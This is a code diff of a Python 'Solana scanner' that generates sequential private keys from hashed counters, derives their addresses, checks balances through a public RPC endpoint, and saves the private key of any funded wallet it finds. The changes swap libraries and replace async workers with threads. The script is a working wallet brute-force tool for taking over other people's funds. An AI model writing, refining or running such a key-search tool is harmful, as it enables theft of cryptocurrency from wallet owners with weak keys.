@@ -7,25 +7,10 @@ import traceback
 import asyncio
 import json
 import hashlib
+import urllib.request
+import urllib.error
 from concurrent.futures import ThreadPoolExecutor
 from argparse import ArgumentParser
-
-# ----- dynamic imports -----
-def ensure_import(name, package=None):
-    try:
-        return __import__(name)
-    except Exception:
-        pkg = package or name
-        print(f"[setup] package '{pkg}' not found, attempting to install...", file=sys.stderr)
-        import subprocess
-        subprocess.check_call([sys.executable, "-m", "pip", "install", pkg])
-        return __import__(name)
-
-aiohttp = ensure_import("aiohttp")
-
-# ed25519 from cryptography (you said it's installed)
-from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
-from cryptography.hazmat.primitives import serialization
 
 # ----- constants -----
 SOL_RPC = "https://solana.publicnode.com"
@@ -78,18 +63,12 @@ def format_found_block(priv_repr, address, balance_str, positive: bool):
         border
     ])
 
-# ----- improved sequential-but-wallet-friendly key generator -----
+# ----- sequential key generator -----
 def gen_sequential_seed():
-    """
-    Produce a deterministic 32-byte seed from a monotonically increasing counter.
-    We hash the counter (big-endian bytes) with SHA-256 and return the digest.
-    This yields evenly-distributed 32 bytes (no long runs of zeros) while remaining sequential/reproducible.
-    """
+    """Generates a deterministic 32-byte seed based on a global counter."""
     global sequential_counter
     sequential_counter += 1
-    # Use the counter as big-endian bytes (minimal length)
     counter_bytes = sequential_counter.to_bytes((sequential_counter.bit_length() + 7) // 8 or 1, "big")
-    # Hash the counter bytes to produce a 32-byte seed
     seed32 = hashlib.sha256(counter_bytes).digest()
     return seed32
 
@@ -109,111 +88,95 @@ def base58_encode(b: bytes) -> str:
             break
     return (B58_ALPHABET[0:1] * leading_zeros + bytes(reversed(res))).decode()
 
-# ----- ed25519 derivation -----
+# ----- ed25519 using installed lightweight library -----
+import ed25519
+
 def ed25519_pub_from_seed(seed32: bytes) -> bytes:
-    priv = Ed25519PrivateKey.from_private_bytes(seed32)
-    pub = priv.public_key()
-    return pub.public_bytes(
-        encoding=serialization.Encoding.Raw,
-        format=serialization.PublicFormat.Raw
-    )
+    """Derive public key from 32-byte private seed."""
+    sk = ed25519.SigningKey(seed32)
+    vk = sk.get_verifying_key()
+    return vk.to_bytes()
 
-# ----- RPC helpers -----
-async def rpc_post_with_retries(url: str, json_payload: dict, session: aiohttp.ClientSession, debug: bool=False, max_attempts: int=3):
-    last_exc = None
-    for attempt in range(1, max_attempts + 1):
-        try:
-            async with session.post(url, json=json_payload, timeout=15) as r:
-                text = await r.text()
-                if debug:
-                    print(f"[debug][rpc] POST {url} payload={json_payload} status={r.status} resp={text}")
-                r.raise_for_status()
-                return await r.json()
-        except Exception as e:
-            last_exc = e
-            if attempt < max_attempts:
-                await asyncio.sleep(attempt)
-    raise last_exc
-
-async def sol_get_balance(rpc_url, address, session, debug=False):
-    payload = {"jsonrpc": "2.0", "id": 1, "method": "getBalance", "params": [address, {"commitment": "confirmed"}]}
-    j = await rpc_post_with_retries(rpc_url, json_payload=payload, session=session, debug=debug) if False else await rpc_post_with_retries(rpc_url, payload, session, debug)
-    if "error" in j:
-        raise RuntimeError(f"RPC error: {j['error']}")
-    res = j.get("result", {})
-    lamports = res.get("value", 0) or 0
-    return int(lamports)
-
-# ----- Solana worker -----
-async def worker_sol_async(rpc_url, debug=False, concurrency=20):
-    async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=30)) as session:
-        sem = asyncio.Semaphore(concurrency)
-
-        async def check_one():
-            async with sem:
-                try:
-                    seed = gen_sequential_seed()
-                    seed_hex = seed.hex()
-                    key_repr = f"solana:{seed_hex}"
-                    if key_repr in in_memory_tried:
-                        return
-                    append_tried(key_repr)
-
-                    pub = ed25519_pub_from_seed(seed)
-                    address = base58_encode(pub)
-
-                    lamports = await sol_get_balance(rpc_url, address, session, debug)
-                    sol_balance = lamports / 1_000_000_000
-                    threshold = 0.000000  # your threshold: >0.000000 = green, ≤0.000000 = red
-                    positive = sol_balance > threshold
-                    bal_str = f"{sol_balance:.9f} SOL (lamports={lamports})"
-
-                    if positive:
-                        secret_bytes = seed + pub
-                        secret_json_array = json.dumps(list(secret_bytes))
-                        print(format_found_block(secret_json_array, address, bal_str, positive))
-                        append_found(f"solana | {secret_json_array} | {address} | {bal_str}")
-                    else:
-                        # show red (hidden priv) as before
-                        print(format_found_block("<hidden>", address, bal_str, positive))
-                except Exception:
-                    if debug:
-                        traceback.print_exc()
-                    await asyncio.sleep(0.01)
-
-        while not stop_event.is_set():
-            tasks = [check_one() for _ in range(concurrency)]
-            await asyncio.gather(*tasks)
-            await asyncio.sleep(0.005)
-
-# ----- async runner -----
-def run_async_worker(coro_func, *args, **kwargs):
+# ----- RPC call using urllib (no aiohttp) -----
+def sol_get_balance(rpc_url, address, debug=False):
+    payload = json.dumps({
+        "jsonrpc": "2.0",
+        "id": 1,
+        "method": "getBalance",
+        "params": [address, {"commitment": "confirmed"}]
+    }).encode()
+    req = urllib.request.Request(rpc_url, data=payload, headers={"Content-Type": "application/json"})
     try:
-        asyncio.run(coro_func(*args, **kwargs))
+        with urllib.request.urlopen(req, timeout=10) as r:
+            text = r.read().decode()
+            j = json.loads(text)
+            if "error" in j:
+                raise RuntimeError(f"RPC error: {j['error']}")
+            value = j.get("result", {}).get("value", 0)
+            return int(value)
+    except urllib.error.URLError as e:
+        if debug:
+            print("[rpc] error:", e)
+        return 0
     except Exception as e:
-        print(f"[worker][fatal] {e}")
+        if debug:
+            traceback.print_exc()
+        return 0
+
+# ----- worker -----
+def sol_worker(debug=False):
+    """Worker thread that generates seeds, checks balances, logs results."""
+    while not stop_event.is_set():
+        try:
+            seed = gen_sequential_seed()
+            seed_hex = seed.hex()
+            key_repr = f"solana:{seed_hex}"
+            if key_repr in in_memory_tried:
+                continue
+            append_tried(key_repr)
+
+            pub = ed25519_pub_from_seed(seed)
+            address = base58_encode(pub)
+
+            lamports = sol_get_balance(SOL_RPC, address, debug)
+            sol_balance = lamports / 1_000_000_000
+            threshold = 0.000000
+            positive = sol_balance > threshold
+            bal_str = f"{sol_balance:.9f} SOL (lamports={lamports})"
+
+            if positive:
+                secret_bytes = seed + pub
+                secret_json_array = json.dumps(list(secret_bytes))
+                print(format_found_block(secret_json_array, address, bal_str, positive))
+                append_found(f"solana | {secret_json_array} | {address} | {bal_str}")
+            else:
+                print(format_found_block("<hidden>", address, bal_str, positive))
+        except Exception:
+            if debug:
+                traceback.print_exc()
+            time.sleep(0.01)
 
 # ----- main -----
 def main():
     parser = ArgumentParser()
     parser.add_argument("-d", "--debug", action="store_true", help="Enable debug output")
-    parser.add_argument("-c", "--concurrency", type=int, default=20, help="Concurrent async requests per worker (default: 20)")
+    parser.add_argument("-w", "--workers", type=int, default=5, help="Number of worker threads (default: 5)")
     args = parser.parse_args()
     debug = args.debug
-    concurrency = max(1, args.concurrency)
+    workers = max(1, args.workers)
 
-    print(f"[info] Starting Solana scanner. Debug={debug}. Mode=sequential-hash. Concurrency={concurrency}. Press Ctrl+C to stop.")
+    print(f"[info] Starting Solana scanner (using ed25519). Debug={debug}. Workers={workers}. Press Ctrl+C to stop.")
     open(TRIED_FILE, "a").close()
     open(FOUND_FILE, "a").close()
 
-    with ThreadPoolExecutor(max_workers=5) as ex:
-        for _ in range(5):
-            ex.submit(run_async_worker, worker_sol_async, SOL_RPC, debug, concurrency)
+    with ThreadPoolExecutor(max_workers=workers) as ex:
+        for _ in range(workers):
+            ex.submit(sol_worker, debug)
         try:
             while not stop_event.is_set():
                 time.sleep(0.5)
         except KeyboardInterrupt:
-            print("\n[info] Ctrl+C detected, shutting down immediately...")
+            print("\n[info] Ctrl+C detected, stopping...")
             stop_event.set()
             time.sleep(0.2)
     print("[info] Scanner stopped. Goodbye.")
